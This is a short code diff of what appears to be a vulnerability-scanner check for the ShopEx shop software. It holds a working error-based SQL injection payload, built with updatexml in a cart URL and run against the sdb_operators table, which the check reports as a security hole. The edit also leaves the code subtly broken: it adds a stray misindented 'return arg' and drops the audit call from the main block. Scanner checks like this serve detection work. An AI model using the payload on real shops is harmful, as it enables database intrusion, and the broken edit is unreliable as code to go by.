@@ -13,6 +13,7 @@ def audit(arg):
         if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
             security_hole(url + '/?cart-46-157)and(1)=(updatexml(1,concat(0x23,(select(md5(3.1415))from(sdb_operators)),0x23),1))%23-addGoodsToCart.html')
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('shopex', 'http://www.example.com/')[1])
